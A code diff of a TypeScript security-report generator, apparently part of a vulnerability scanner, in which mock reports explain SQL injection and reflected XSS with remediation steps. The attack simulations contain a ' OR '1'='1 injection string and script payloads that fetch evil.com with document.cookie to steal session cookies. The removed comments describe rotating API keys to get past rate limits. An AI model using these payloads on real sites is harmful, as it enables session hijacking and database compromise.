@@ -1,12 +1,6 @@
 const CEREBRAS_BASE_URL = "https://api.cerebras.ai/v1";
 const MODEL = "gpt-oss-120b";
 
-// ── Round-Robin Key Rotator ────────────────────────────────────────────────
-// Reads up to 3 Cerebras API keys from environment variables.
-// Each request uses the next key in sequence:
-//   Request 1 → KEY_1, Request 2 → KEY_2, Request 3 → KEY_3, Request 4 → KEY_1, ...
-// If a key returns 429 (rate limit), the rotator automatically retries with the next key.
-
 let _rotatorIndex = 0;
 
 function getApiKeys(): string[] {
@@ -88,11 +82,11 @@ function getMockFixReport(params: {
         return {
             title: isForm ? "SQL Injection via Form Field" : "SQL Injection via URL Parameter",
             explanation: isForm
-              ? `The application is vulnerable to SQL Injection via form field submission. The field "${params.parameter || "search"}" submits user input directly into a database query without sanitization. Attackers can type crafted payloads into the form to dump tables, bypass authentication, or delete data.`
-              : `The application is vulnerable to SQL Injection because user-supplied input in the parameter "${params.parameter || "id"}" is concatenated directly into a database query. This allows an attacker to manipulate SQL syntax and execute unauthorized queries, potentially exposing, modifying, or deleting sensitive database records.`,
+                ? `The application is vulnerable to SQL Injection via form field submission. The field "${params.parameter || "search"}" submits user input directly into a database query without sanitization. Attackers can type crafted payloads into the form to dump tables, bypass authentication, or delete data.`
+                : `The application is vulnerable to SQL Injection because user-supplied input in the parameter "${params.parameter || "id"}" is concatenated directly into a database query. This allows an attacker to manipulate SQL syntax and execute unauthorized queries, potentially exposing, modifying, or deleting sensitive database records.`,
             attackSimulation: isForm
-              ? `1. The attacker opens the form at: ${params.url}\n2. They type a payload into the "${params.parameter || "search"}" field: ' OR '1'='1\n3. On submit, the server executes the malformed SQL and either returns all rows or shows a database error confirming injection.`
-              : `1. The attacker targets the URL: ${params.url}\n2. They supply a payload in the "${params.parameter || "id"}" parameter, such as: ' OR '1'='1\n3. The database interprets the payload as SQL logic, bypassing the password check or returning all records in the table.`,
+                ? `1. The attacker opens the form at: ${params.url}\n2. They type a payload into the "${params.parameter || "search"}" field: ' OR '1'='1\n3. On submit, the server executes the malformed SQL and either returns all rows or shows a database error confirming injection.`
+                : `1. The attacker targets the URL: ${params.url}\n2. They supply a payload in the "${params.parameter || "id"}" parameter, such as: ' OR '1'='1\n3. The database interprets the payload as SQL logic, bypassing the password check or returning all records in the table.`,
             fixSteps: [
                 "Use parameterized queries or prepared statements (e.g., Prisma ORM, pg-promise parameterized queries).",
                 "Validate and strongly type all inputs server-side before passing to database layer.",
@@ -116,11 +110,11 @@ function getMockFixReport(params: {
         return {
             title: isForm ? "Reflected XSS via Form Input" : "Reflected Cross-Site Scripting (XSS)",
             explanation: isForm
-              ? `The form field "${params.parameter || "search"}" at ${params.url} reflects submitted input back in the page response without HTML-encoding. An attacker can submit a form with a malicious script payload; when the server echoes it back, the browser executes the script in the victim's session.`
-              : `The application fails to sanitize or encode query input from parameter "${params.parameter || "query"}" before rendering it in the HTML response. An attacker can craft a malicious URL containing JavaScript; when a victim visits it, the script runs in their browser context, allowing session hijack or data theft.`,
+                ? `The form field "${params.parameter || "search"}" at ${params.url} reflects submitted input back in the page response without HTML-encoding. An attacker can submit a form with a malicious script payload; when the server echoes it back, the browser executes the script in the victim's session.`
+                : `The application fails to sanitize or encode query input from parameter "${params.parameter || "query"}" before rendering it in the HTML response. An attacker can craft a malicious URL containing JavaScript; when a victim visits it, the script runs in their browser context, allowing session hijack or data theft.`,
             attackSimulation: isForm
-              ? `1. The attacker opens the form at ${params.url}.\n2. They type into the "${params.parameter || "search"}" field: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n3. On submit, the server includes the payload unencoded in the response.\n4. The victim's browser executes the script, sending their session cookie to the attacker.`
-              : `1. The attacker crafts a link: ${params.url}?${params.parameter || "query"}=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\n2. The attacker sends this link to a logged-in user.\n3. The user clicks it. The browser receives the payload and executes it, sending the user's session cookies to the attacker.`,
+                ? `1. The attacker opens the form at ${params.url}.\n2. They type into the "${params.parameter || "search"}" field: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n3. On submit, the server includes the payload unencoded in the response.\n4. The victim's browser executes the script, sending their session cookie to the attacker.`
+                : `1. The attacker crafts a link: ${params.url}?${params.parameter || "query"}=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\n2. The attacker sends this link to a logged-in user.\n3. The user clicks it. The browser receives the payload and executes it, sending the user's session cookies to the attacker.`,
             fixSteps: [
                 "HTML-encode all user-supplied values before inserting them into HTML responses (use he, DOMPurify, or framework-native escaping).",
                 "Implement a strict Content-Security-Policy (CSP) that blocks inline scripts and restricts script sources.",
